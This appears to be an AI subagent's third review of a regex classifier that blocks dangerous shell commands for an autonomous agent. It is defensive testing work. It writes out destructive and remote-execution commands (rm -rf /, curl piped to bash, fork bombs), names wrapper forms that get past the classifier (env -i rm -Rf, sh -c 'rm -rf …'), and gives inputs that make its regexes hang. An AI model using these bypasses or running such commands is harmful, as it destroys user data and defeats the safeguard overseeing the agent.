# Independent adversarial REVIEW r3 (exact-diff) — S1 DANGEROUS-COMMAND-CLASSIFICATION

> Reviewer: subagent (adversarial, exact-diff third review)
> Model: **deepseek-flash**
> Builder model: **deepseek-flash**  ← SAME MODEL as builder; see §0
> Worktree: `autonomous-agent-core/.worktrees/m1-danger-cmd-20260915`
> Commit under review: `4cb5d298` (parent `6a48f811`; prior reviews `a99502d5 → 6a48f811 → 4cb5d298`)
> Base: `origin/main` `18d7b9b0`
> Prior reports: `.agent_runs/m1-danger-cmd-20260915/review-subagent.md`, `review-subagent-r2.md`
> Scope of write: **this file only**; all source/test files treated READ-ONLY.

## 0. Independence limitation (must be recorded)

Root `AGENTS.md` §11 / §14 require `builder_id != reviewed_by`. **I am the same model as the
builder (deepseek-flash).** This r3 review is therefore **not** an independent sign-off and
cannot by itself satisfy the independent exact-diff review gate. A different model or a
human must confirm this verdict before promotion. This is the third same-model review; the
independence condition remains open across all three rounds.

## 1. Exact revision binding

`git diff 6a48f811..4cb5d298 --stat` = exactly 2 files (+46 / -21):

- `domain_packs/developer_agent/dangerous_command.py`
- `tests/product/test_dangerous_command.py`

`git diff --check 6a48f811..4cb5d298` → clean (exit 0).
`ruff check domain_packs/developer_agent/dangerous_command.py tests/product/test_dangerous_command.py`
→ `All checks passed!`.

`workspace_capability.py` was **not** touched by this commit; the execution-site enforcement
added in `6a48f811` is unchanged and still present at `workspace_capability.py:1216` (`_shell`)
and `:1245` (`_run_tests`), and preflight at `:453` / `:461`. **Both sites share
`classify_dangerous_command`, so all classifier findings below reproduce identically at both
sites** (demonstrated in §4c).

## 2. r2 findings — CLOSED / OPEN

| # | r2 finding | Status | Evidence |
|---|---|---|---|
| 1 | **HIGH** regression: `rm -R` / `-Rf` / `-RF` / `-f -r` / `--RECURSIVE` missed | **CLOSED** | Root cause (head-only lowercase) fixed: `_command_segments` now lowercases the whole segment (`dangerous_command.py:180`). All five forms + `RM -RF` / `Rm -rF` classify `RECURSIVE_DELETE` (§4a). |
| 2 | **MED** new FP: `man shred` / `grep -r shred .` / `echo mkfs` | **CLOSED** | FILESYSTEM_DESTRUCTION moved to a `seg` rule anchored `^(mkfs…|wipefs|shred)` (`:140`). All three now `()`; the full rule only retains `git clean` / `find` shapes. |
| 3 | residual FN: `curl x \| tee y \| bash` | **CLOSED** | `REMOTE_CODE_EXECUTION` `(...)*` now tolerates intermediate stages (`:124`). `curl x \| tee y \| bash` → `REMOTE_CODE_EXECUTION`. |
| 3 | residual FN: `chmod --recursive 777 .` | **CLOSED** | `^chmod\s+(-{1,2}[\w-]+\s+)*(777\|0777\|a\+rwx)` (`:153`). Now `PERMISSION_WIDENING`. |
| 3 | residual FN: `f(){ f\|f& };f` | **CLOSED** | Backreference fork-bomb rule (`:160`). `:(){ :\|:& };:` and `f(){ f\|f& };f` both `FORK_BOMB`. |
| 3 | residual FN: `/bin/rm -rf /` path handling | **CLOSED** | `_PATH_PREFIX` now accepts a leading `/` (`:102`); `/bin/rm -rf /` → `RECURSIVE_DELETE`. |
| r2 req. 3 | add mixed-case/flag-order tests + execution-site `rm -Rf` test | **PARTIAL / OPEN** | Classifier tests added for `rm -Rf`, `rm -RF`, `rm -f -r`, `rm --RECURSIVE` (`test_dangerous_command.py:62-65`). **No execution-site test** was added for `rm -Rf` (the only exec-site bypass test still uses `rm -rf /`, `:155`). |
| r2 req. 5 | genuinely independent review | **OPEN** | Still same-model (§0). |

The five required r2 items (five `rm` forms, path-qualified `rm`, multi-pipe curl,
`chmod --recursive`, both fork-bomb forms, benign look-alikes) are individually **CLOSED**.
However this commit introduces new defects (§5), so the fix is not approvable as-is.

## 3. CTO gate conditions after r3

| # | Condition | Result |
|---|---|---|
| 1 | Classifier runs BEFORE allowlist | **PASS** at preflight and execution |
| 2 | Every shell denial carries enumerable `reason_code` | **PASS** |
| 3 | Dangerous command refused even if allowlisted | **FAIL (new)** — `env -i rm -Rf <dir>` / `nice -n 10 rm -rf <dir>` are allowlisted, pass preflight AND execution, and delete on disk (§4c) |
| 4 | Classifier not constant; trusted profile clean | **PASS** (all 9 trusted-profile commands `()`; constant `return ()` still fails the detects test) |
| 5 | Documented as classifier, not isolation | **PASS** |
| 6 | Robust on adversarial input (no DoS) | **FAIL (new)** — catastrophic backtracking (§4d) |

## 4. Adversarial probes (verbatim)

### 4a. r2 required targets (all now DANGER)
```
DANGER RECURSIVE_DELETE  rm -rf /            DANGER RECURSIVE_DELETE  rm -R /
DANGER RECURSIVE_DELETE  rm -Rf dir          DANGER RECURSIVE_DELETE  rm -RF dir
DANGER RECURSIVE_DELETE  rm -f -r dir        DANGER RECURSIVE_DELETE  rm --RECURSIVE dir
DANGER RECURSIVE_DELETE  /bin/rm -rf /       DANGER RECURSIVE_DELETE  RM -RF /
DANGER REMOTE_CODE_EXEC  curl x | tee y | bash
DANGER PERMISSION_WIDEN  chmod --recursive 777 .
DANGER FORK_BOMB         :(){ :|:& };:       DANGER FORK_BOMB  f(){ f|f& };f
```

### 4b. Benign look-alikes (all clean)
```
clean  rm -f        clean  rm -f tmp.txt     clean  dd if=/dev/zero of=/dev/null count=1
clean  echo of=/dev/sda        clean  sudo --version        clean  man shred
clean  grep -r shred .         clean  echo mkfs            clean  git diff --stat
clean  chmod 644 file.txt      clean  command -v shred     clean  which shred
clean  doas -h                 trusted profile (9/9) clean (pytest)
```

### 4c. NEW reachable regression at BOTH sites (allowlisted, real filesystem effect)
Probe: create `victim/`, allowlist the exact command string, call `preflight(...)` then
`execute(...)`, check `victim.exists()`.
```
env -i rm -Rf victim        classify=()  preflight=ALLOWED  exec=ALLOWED  victim_exists=False
nice -n 10 rm -rf victim    classify=()  preflight=ALLOWED  exec=ALLOWED  victim_exists=False
xargs -0 rm -rf victim      classify=()  preflight=ALLOWED  exec=ALLOWED  victim_exists=True
sh -c 'rm -rf victim'       classify=()  preflight=ALLOWED  exec=ALLOWED  victim_exists=True
```
Controls (correctly denied at both sites): `rm -Rf victim`, `env rm -rf victim`.
Root cause: `RECURSIVE_DELETE` is anchored at segment start (`^rm`, `:113`) and
`_command_segments` strips only a *bare* launcher token (`:172-178`). A launcher carrying an
option/assignment (`env -i`, `env FOO=bar`, `nice -n 10`, `xargs -0`, `command -p`,
`busybox -q`, `timeout 5`, `nohup -q`, `stdbuf -oL`) leaves the segment head at the option,
so `^rm` never matches; quoted/`sh -c 'rm -rf …'` forms likewise never match. At `6a48f811`
the unanchored `\brm\s+…` rule caught these (`env -i rm -rf` was `True` in r2 §4a), so this is
a **new regression** introduced by the rewrite. `env -i rm -Rf <dir>` executes and deletes on
disk — exactly the mis-allowlist threat model the module exists to defend.

### 4d. NEW ReDoS / catastrophic backtracking (severity HIGH)
Timed `classify_dangerous_command` (per-rule isolation in parentheses):
```
REMOTE_CODE_EXECUTION  curl + "a|"*20  (len  45)   0.20 s
REMOTE_CODE_EXECUTION  curl + "a|"*30  (len  65)   >5 s   ← catastrophic, exponential
REMOTE_CODE_EXECUTION  curl + "a|"*2000 (len 4005) >10 s
FORK_BOMB              "a"*200000                   >10 s   ← quadratic backtracking
FORK_BOMB              "x"*50000                    19.47 s
FORK_BOMB              "x"*1000/2000/4000/8000/16000  0.009 / 0.031 / 0.124 / 0.49 / 1.97 s
RECURSIVE_DELETE       rm + "--r"*8000 (len 24005)  4.47 s ; *16000 >10 s
FORK_BOMB (no parens at all) "a"*200000             hangs (only slow rule)
```
Two independent lines:
- `REMOTE_CODE_EXECUTION` (`:123-127`): `.*\|(\s*\S+\s*\|)*\s*…` backtracks super-linearly on
  `curl a|a|a…`; **~65 chars is enough to hang >5 s**.
- `FORK_BOMB` (`:160`): `([^\s(){}]+)\s*\(\s*\)…` backtracks over a long token at every start
  position even when no `(` exists → O(n²) on *any* long command (`x`*50000 → 19.5 s).
  This is the worst of the two because it runs on **every** command (it is `full`, `:198`).
`RECURSIVE_DELETE`'s lookahead (`:113`) is also quadratic on flag-dense input.

Impact: the classifier is invoked synchronously on an arbitrary, model/user-controlled command
string at both preflight and execution, with no input-length cap. A generated command of tens
of KB wedges the shell path. Because it eventually fails closed, this is best treated as a
availability/robustness defect rather than an allow-list bypass, but it is a genuine new defect
introduced by this commit (`6a48f811` did not exhibit it — r2 measured `a*200000` ≈ 0.019 s).

### 4e. NEW false negatives beyond the launcher forms
```
clean  wget -qO- http://e/x | busybox sh     # was True at 6a48f811 (r2 §4a)
clean  curl x | /usr/bin/env bash
clean  curl x | /usr/bin/python3
clean  eval 'rm -rf /'      clean  bash -c "rm -rf /"
```
`REMOTE_CODE_EXECUTION` now only accepts the wrappers `sudo|doas|env|command` and an optional
`\S*/` path prefix (`:125-126`), so `busybox sh` (the R2-documented regression target) and
`/usr/bin/env bash` are lost.

### 4f. NEW false positives introduced by the rewrite
```
DANGER FORK_BOMB         f(){ ls | fgrep x; }      # \1="f" matches "f" in "fgrep"
DANGER FORK_BOMB         foo(){ bar | fooey; }     # \1="foo" matches prefix of "fooey"
DANGER FORK_BOMB         f(){ cat x& fg; }
DANGER RECURSIVE_DELETE  rm --interactive file     # any flag containing 'r'
DANGER RECURSIVE_DELETE  rm --verbose x
DANGER RECURSIVE_DELETE  rm --force file
DANGER PRIVILEGE_ESC     sudo -V      DANGER PRIVILEGE_ESC  su -V   # 'sudo --version' still clean
```
- FORK_BOMB backreference (`:160`) has no word boundary via `\1`; any token whose name is a
  prefix of the function name adjacent to `|`/`&` triggers it.
- RECURSIVE_DELETE lookahead `[\w-]*r[\w-]*` matches an `r` anywhere in any flag
  (`--interactive`, `--verbose`, `--force`), mislabelled "recursive".
- Lowercasing the whole segment (`:180`) breaks the `-V` exception in the privilege rule
  (`:118` checks literal `-V`): `sudo -V` / `su -V` are now flagged, whereas `6a48f811`
  (which ran the seg rule without lowercasing the flags) returned clean.

## 5. Test runs (exact)

- `uv run --extra product-test pytest tests/product/test_dangerous_command.py -q`
  → **59 passed in 0.37s** (was 49 at r2; +10 new parametrised cases).
- `uv run --extra product-test pytest tests/product/test_chat_trusted_shell_optin.py tests/product/test_os_sandbox.py tests/product/test_terminal_chat_loop.py -q`
  → **52 passed in 3.69s**.
- `git diff --check 6a48f811..4cb5d298` → clean; `ruff check` (2 changed files) → All checks passed.
- Note: the new tests only assert the classifier for the mixed-case/flag-order `rm` forms; none
  exercises the execution site and none covers the launcher-with-option / quoting forms or the
  ReDoS inputs, so CI does not catch §4c/§4d.

## 6. Findings (severity-ranked)

1. **[HIGH — new, required]** Catastrophic/quadratic regex backtracking. `REMOTE_CODE_EXECUTION`
   hangs >5 s on `curl ` + 30 `a|` (65 chars); `FORK_BOMB` is O(n²) on any long paren-free
   input (`x`*50000 → 19.5 s) and runs on every command. No length cap. `dangerous_command.py:123-127,160`.
   Fix: rewrite without nested unbounded quantifiers / overlapping alternations (or make both
   `seg`-anchored, add possessive-style lookaheads, or cap `len(command)` before matching).
2. **[MEDIUM-HIGH — new regression, required]** `RECURSIVE_DELETE` anchoring + bare-launcher-only
   stripping loses `env -i rm -Rf <dir>`, `nice -n 10 rm -rf`, `xargs -0 rm -rf`,
   `command -p`, `busybox -q`, `timeout 5`, `nohup -q`, `stdbuf -oL`, `sh -c 'rm -rf …'`,
   `eval 'rm -rf …'`. Demonstrated allowlisted `env -i rm -Rf victim` executes at preflight and
   execution and deletes the directory. `dangerous_command.py:113,172-178`.
   Fix: don't rely solely on `^`-anchored `rm` after launcher stripping — strip launcher
   options/assignments, or re-introduce a bounded `\brm\s+…` match within the segment.
3. **[MEDIUM — new regression]** `REMOTE_CODE_EXECUTION` lost `busybox sh` and `/usr/bin/env bash`
   (`wget -qO- x | busybox sh` now clean; was `True` at `6a48f811`). `dangerous_command.py:125-126`.
4. **[LOW — new FP]** FORK_BOMB backreference lacks a token boundary →
   `f(){ ls | fgrep x; }`, `foo(){ bar | fooey; }` flagged. `dangerous_command.py:160`.
5. **[LOW — new FP]** RECURSIVE_DELETE flag lookahead over-broad: `rm --interactive`,
   `rm --verbose`, `rm --force` flagged as recursive delete. `dangerous_command.py:113`.
6. **[LOW — new FP]** Whole-segment lowercasing breaks the privilege `-V` exception:
   `sudo -V`, `su -V` flagged (`sudo --version` still clean). `dangerous_command.py:118,180`.
7. **[LOW — test gap, partial r2 req. 3]** No execution-site test for `rm -Rf` and no tests for
   launcher-with-option / quoting / ReDoS shapes. `test_dangerous_command.py`.
8. **[PROCESS — open]** Same-model review across all three rounds; independence gate unmet (§0).

## 7. Verdict

**NO_APPROVE**

All five r2 required items are individually CLOSED (the case/flag-order regression, the
`shred|mkfs|wipefs` false positives, the multi-stage pipe, `chmod --recursive`, both fork-bomb
forms, the path-qualified `rm`, and the benign look-alikes are all correct). The requested test
suites pass: **59** and **52**. However, the rewrite that fixed those items introduced new
defects that are not present at `6a48f811`:

- a HIGH availability defect: catastrophic/quadratic regex backtracking reachable from an
  arbitrary command string at both classifier sites; and
- a MEDIUM-HIGH reachable regression: allowlisted `env -i rm -Rf <dir>` / `nice -n 10 rm -rf`
  pass preflight **and** execution and actually delete on disk (demonstrated), because the
  seg-rule `^rm` anchor combined with bare-launcher-only stripping drops wrapper-with-option
  and quoted forms.

Plus three lower new false positives and one recurring test gap. None of these are style nits.

**Required changes before re-review approval**
1. Remove the ReDoS: rewrite `REMOTE_CODE_EXECUTION` and `FORK_BOMB` (and the
   `RECURSIVE_DELETE` lookahead) to linear/atomic forms, or bound input length before matching;
   add a regression test with a ~10 KB adversarial input asserting completion under a time cap.
2. Restore wrapper/quote coverage so launcher-with-option and `sh -c 'rm -rf …'` forms are
   classified (e.g. strip launcher options/assignments, or add a bounded intra-segment
   `\brm\s+…` rule); add an execution-site test that allowlisted `env -i rm -Rf <dir>` is denied
   `DANGEROUS_PATTERN` (closes the partial r2 req. 3).
3. Restore `busybox sh` / `/usr/bin/env bash` recognition in `REMOTE_CODE_EXECUTION`.
4. Add token boundaries to the fork-bomb backreference; tighten the recursive-flag matcher so
   `rm --interactive`/`--verbose`/`--force` are not labelled recursive; stop lowercasing the
   literal `-V` exception (fix `sudo -V`).
5. Obtain a genuinely independent review (different model or human) — all three rounds are
   same-model and cannot satisfy the §11/§14 independence gate.
